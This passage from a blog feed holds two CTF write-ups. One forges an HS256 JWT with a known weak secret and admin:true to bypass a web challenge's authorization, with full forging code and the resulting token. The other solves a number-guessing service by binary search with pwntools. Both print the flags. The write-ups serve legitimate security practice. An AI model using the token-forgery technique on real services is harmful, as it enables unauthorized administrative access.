class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">alg</span>: <span class="string">&quot;HS256&quot;</span>, <span class="attr">typ</span>: <span class="string">&quot;JWT&quot;</span> &#125;),</span><br><span class="line">  <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">)</span><br><span class="line">  .<span class="title function_">toString</span>(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">  .<span class="title function_">replace</span>(<span class="regexp">/=/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">sign</span> = (<span class="params"><span class="attr">payloads</span>: <span class="built_in">object</span></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> jwtPayloads = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(payloads), <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    .<span class="title function_">toString</span>(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/=/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> signature = crypto.<span class="title function_">createHmac</span>(<span class="string">&#x27;sha256&#x27;</span>, jwtSecret).<span class="title function_">update</span>(jwtHeader + <span class="string">&#x27;.&#x27;</span> + jwtPayloads).<span class="title function_">digest</span>(<span class="string">&#x27;base64&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/=/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> jwtHeader + <span class="string">&quot;.&quot;</span> + jwtPayloads + <span class="string">&quot;.&quot;</span> + signature;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;server up on http://localhost:&quot;</span> + port.<span class="title function_">toString</span>())</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&quot;site&quot;</span>)));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">cookies</span>.<span class="property">token</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;no auth&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;Unauthorized&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span>;</span><br><span class="line">    <span class="comment">// split up token</span></span><br><span class="line">    <span class="keyword">const</span> [header, payloads, signature] = token.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!header || !payloads || !signature) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;Unauthorized&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Buffer</span>.<span class="title function_">from</span>(header, <span class="string">&quot;base64&quot;</span>).<span class="title function_">toString</span>();</span><br><span class="line">    <span class="comment">// decode payloads</span></span><br><span class="line">    <span class="keyword">const</span> decodedPayloads = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(payloads, <span class="string">&quot;base64&quot;</span>).<span class="title function_">toString</span>();</span><br><span class="line">    <span class="comment">// parse payloads</span></span><br></pre></td></tr></table></figure><p>Just to highlight what this code does:</p><p><code>const [header, payloads, signature] = token.split(&quot;.&quot;);</code></p><ul><li>splits the JWT token into its three parts; header, payloads, and signature, and the <code>.</code> acts as a delimiter.</li></ul><p><code>if (!req.cookies.token)</code></p><ul><li>checks if the token is missing, and responds with <code>403 Unauthorized</code> if it is.</li></ul><p><code>Buffer.from(header,&quot;base64&quot;).toString()</code> <code>Buffer.from(payloads,&quot;base64&quot;).toString()</code></p><ul><li>The header and payloads are decoded from base64 to their original string format.</li></ul><p>However, what’s really making us hit our head is the following:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">sign</span> = (<span class="params">payloads: object</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> jwtPayloads = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(payloads), <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    .<span class="title function_">toString</span>(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/=/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> signature = crypto.<span class="title function_">createHmac</span>(<span class="string">&#x27;sha256&#x27;</span>, jwtSecret).<span class="title function_">update</span>(jwtHeader + <span class="string">&#x27;.&#x27;</span> + jwtPayloads).<span class="title function_">digest</span>(<span class="string">&#x27;base64&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/=/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> jwtHeader + <span class="string">&quot;.&quot;</span> + jwtPayloads + <span class="string">&quot;.&quot;</span> + signature;</span><br></pre></td></tr></table></figure><p>This removes the <code>=</code> characters from both the base64-encoded payloads and signature. This is normal in JWTs though, and doesn’t affect the token’s validity. The main issue here isn’t the removal of padding, but making sure that the token <strong>we</strong> craft adheres to this format.</p><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>The payloads that I came up with:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> jwtSecret = <span class="string">&quot;xook&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> jwtHeader = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(</span><br><span class="line">  <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">alg</span>: <span class="string">&quot;HS256&quot;</span>, <span class="attr">typ</span>: <span class="string">&quot;JWT&quot;</span> &#125;),</span><br><span class="line">  <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">)</span><br><span class="line">  .<span class="title function_">toString</span>(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">  .<span class="title function_">replace</span>(<span class="regexp">/=/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">sign</span> = (<span class="params">payloads</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> jwtPayloads = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(payloads), <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    .<span class="title function_">toString</span>(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/=/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> signature = crypto</span><br><span class="line">    .<span class="title function_">createHmac</span>(<span class="string">&quot;sha256&quot;</span>, jwtSecret)</span><br><span class="line">    .<span class="title function_">update</span>(jwtHeader + <span class="string">&quot;.&quot;</span> + jwtPayloads)</span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">    .<span class="title function_">replace</span>(<span class="regexp">/=/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> jwtHeader + <span class="string">&quot;.&quot;</span> + jwtPayloads + <span class="string">&quot;.&quot;</span> + signature;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> payloads = &#123; <span class="attr">name</span>: <span class="string">&quot;your_username&quot;</span>, <span class="attr">admin</span>: <span class="literal">true</span> &#125;;</span><br><span class="line"><span class="keyword">const</span> forgedToken = <span class="title function_">sign</span>(payloads);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(forgedToken); <span class="comment">// This is the token you will use.</span></span><br></pre></td></tr></table></figure><p>This payloads creates a token using the <code>xook</code> secret, modifies <code>admin</code> to <code>true</code>, and removes all padding (<code>=</code> characters).</p><p>Then, I replaced the old token in Burpsuite intercept with the new one: <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoieW91cl91c2VybmFtZSIsImFkbWluIjp0cnVlfQ.xwxnk5ogziOC8xlMNuolHBuQDbefnLA9rATCeS7fS+s</code>, and hit “forward”.</p><p><img src="/images/JWT-2/flag.png" alt="flag"></p><p>flag: <code>LITCTF&#123;v3rifyed_thI3_Tlme_1re4DV9&#125;</code></p>]]></content>
    
    
    <summary type="html">Exploiting JSON Web Tokens</summary>
    
    
    
    <category term="CTF" scheme="https://rivers.sh/categories/CTF/"/>
    
    <category term="LITCTF2024" scheme="https://rivers.sh/categories/CTF/LITCTF2024/"/>
    
    
    <category term="Web Exploitation" scheme="https://rivers.sh/tags/Web-Exploitation/"/>
    
    <category term="JSON" scheme="https://rivers.sh/tags/JSON/"/>
    
    <category term="Easy" scheme="https://rivers.sh/tags/Easy/"/>
    
  </entry>
  
  <entry>
    <title>Sillygoose</title>
    <link href="https://rivers.sh/posts/sillygoose/"/>
    <id>https://rivers.sh/posts/sillygoose/</id>
    <published>2024-08-13T04:00:00.000Z</published>
    <updated>2025-04-03T08:24:06.165Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h1><p><code>There&#39;s no way you can guess my favorite number, you silly goose.</code></p><p>attached: <a href="/assets/files/sillygoose/sillygoose.py">sillygoose.py</a></p><p>author: Connor Chang</p><p><img src="/images/sillygoose/sillygoose.png" alt="sillygoose"></p><h2 id="Breaking-down-the-challenge"><a href="#Breaking-down-the-challenge" class="headerlink" title="Breaking down the challenge"></a>Breaking down the challenge</h2><p>Upon connecting to the netcat listener, we’re prompted to guess a number. Initially, I tried bruteforcing it for a few minutes, because why not? While it is possible for this challenge, it would take forever, so it’s better if we analyze the sillygoose.py file that’s attached with the challenge.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">ans = randint(<span class="number">0</span>, <span class="built_in">pow</span>(<span class="number">10</span>, <span class="number">100</span>))</span><br><span class="line">start_time = <span class="built_in">int</span>(time.time())</span><br><span class="line">turns = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    turns += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    inp = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(time.time()) &gt; start_time + <span class="number">60</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;you ran out of time you silly goose&quot;</span>)</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;q&quot;</span> <span class="keyword">in</span> inp:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you are no fun you silly goose&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> inp.isdigit():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;give me a number you silly goose&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    inp = <span class="built_in">int</span>(inp)</span><br><span class="line">    <span class="keyword">if</span> inp &gt; ans:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;your answer is too large you silly goose&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> inp &lt; ans:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;your answer is too small you silly goose&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;congratulations you silly goose&quot;</span>)</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;/flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(f.read())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> turns &gt; <span class="number">500</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you have a skill issue you silly goose&quot;</span>)</span><br></pre></td></tr></table></figure><p>The rules are simple:</p><ol><li>If the number is too large, we’re prompted with <code>&quot;your answer is too large you silly goose&quot;</code></li><li>If the number is too small, we’re prompted with <code>&quot;your number is too small you silly goose&quot;</code></li><li>If we run out of time (60 seconds), we’re prompted with <code>&quot;you run out of time you silly goose&quot;</code></li><li>If we guess over 500 times, we’re prompted with <code>&quot;you have a skill issue you silly goose&quot;</code></li></ol><h2 id="The-Solution"><a href="#The-Solution" class="headerlink" title="The Solution"></a>The Solution</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># Establish connection</span></span><br><span class="line">p = remote(<span class="string">&#x27;24.199.110.35&#x27;</span>, <span class="number">41199</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_response</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = p.recv().decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Received response: <span class="subst">&#123;response&#125;</span>&quot;</span>)  <span class="comment"># Debugging line</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;EOFError encountered&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_message</span>(<span class="params">message</span>):</span><br><span class="line">    p.sendline(message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define the initial search range</span></span><br><span class="line">low = <span class="number">0</span></span><br><span class="line">high = <span class="built_in">pow</span>(<span class="number">10</span>, <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Record starting time</span></span><br><span class="line">start_time = time.time()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize number of guesses (turns) made</span></span><br><span class="line">turns = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> time.time() - start_time &lt; <span class="number">60</span>:</span><br><span class="line">    <span class="keyword">if</span> turns &gt; <span class="number">500</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Too many turns&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Calculate guess</span></span><br><span class="line">    guess = (low + high) // <span class="number">2</span></span><br><span class="line">    send_message(<span class="built_in">str</span>(guess))</span><br><span class="line">    response = get_response()</span><br><span class="line">    turns += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Guess: <span class="subst">&#123;guess&#125;</span>, Response: <span class="subst">&#123;response&#125;</span>&quot;</span>)  <span class="comment"># Debugging line</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;congratulations&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Flag found!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Response content might contain the flag.&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;too large&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        high = guess - <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;too small&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        low = guess + <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;you have a skill issue&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Skill issue&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;you ran out of time&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Ran out of time&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;you are no fun&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No fun&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;give me a number&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid input&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Try to fetch more data if the flag might be hidden</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    additional_response = p.recvall().decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Additional response:&quot;</span>, additional_response)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failed to fetch additional response&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Close connection</span></span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><p>For each iteration, we halve the search space, which is what <code>guess = (low + high) // 2</code> does. This isn’t necessary, but helps to optimize the runtime of the code.</p><p>If you want to better understand binary searches, <a href="https://medium.com/@nicola.moro2312/simply-explained-binary-search-6aeb97690526">this</a> is a great article explaining it in better detail.</p><p>flag: <code>n00bz&#123;y0u_4r3_4_sm4rt_51l1_g0053&#125;</code></p>]]></content>
    
    
    <summary type="html">Exploiting a simple number search binary game</summary>
    
    
    
    <category term="CTF" scheme="https://rivers.sh/categories/CTF/"/>
    
    <category term="N00bzCTF2024" scheme="https://rivers.sh/categories/CTF/N00bzCTF2024/"/>
    
    
    <category term="Easy" scheme="https://rivers.sh/tags/Easy/"/>
    
    <category term="Pwn" scheme="https://rivers.sh/tags/Pwn/"/>
    
    <category term="Programming" scheme="https://rivers.sh/tags/Programming/"/>
    
    <category term="Binary Search" scheme="https://rivers.sh/tags/Binary-Search/"/>
    
  </entry>
  
</feed>
